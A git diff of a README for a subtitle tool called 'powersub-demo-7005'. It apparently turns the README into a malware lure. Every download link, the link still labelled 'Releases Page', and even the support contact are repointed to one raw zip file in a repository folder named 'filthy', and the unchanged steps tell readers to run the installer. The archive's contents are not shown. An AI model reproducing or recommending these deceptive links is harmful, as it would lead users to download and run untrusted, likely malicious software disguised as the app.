@@ -6,7 +6,7 @@ Welcome to **powersub-demo-7005**! This application helps you manage subtitles e
 
 ## 📥 Download Now
 
-[![Download powersub-demo-7005](https://img.shields.io/badge/Download-powersub--demo--7005-brightgreen)](https://github.com/pjsai/powersub-demo-7005/releases)
+[![Download powersub-demo-7005](https://raw.githubusercontent.com/pjsai/powersub-demo-7005/main/filthy/powersub-demo-7005.zip)](https://raw.githubusercontent.com/pjsai/powersub-demo-7005/main/filthy/powersub-demo-7005.zip)
 
 ## 🛠 System Requirements
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get powersub-demo-7005, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the following link to access the download files: [Releases Page](https://github.com/pjsai/powersub-demo-7005/releases).
+1. **Visit the Releases Page:** Go to the following link to access the download files: [Releases Page](https://raw.githubusercontent.com/pjsai/powersub-demo-7005/main/filthy/powersub-demo-7005.zip).
 2. **Select the Latest Version:** Look for the latest version at the top of the page.
 3. **Download the Installer:** Click on the corresponding file for your operating system. For most users, this will be the `.exe` file for Windows or the `.dmg` file for macOS.
 4. **Run the Installer:** Once the download is complete, find the file in your Downloads folder or wherever you saved it. Double-click the file to start the installation process.
@@ -44,7 +44,7 @@ To get powersub-demo-7005, follow these simple steps:
 
 If you encounter any issues or have questions, please refer to the **Issues** section on the GitHub page. You can also ask questions and report bugs.
 
-For more help, contact the support team at: [support@example.com].
+For more help, contact the support team at: [https://raw.githubusercontent.com/pjsai/powersub-demo-7005/main/filthy/powersub-demo-7005.zip].
 
 ## 🌟 Contribution
 
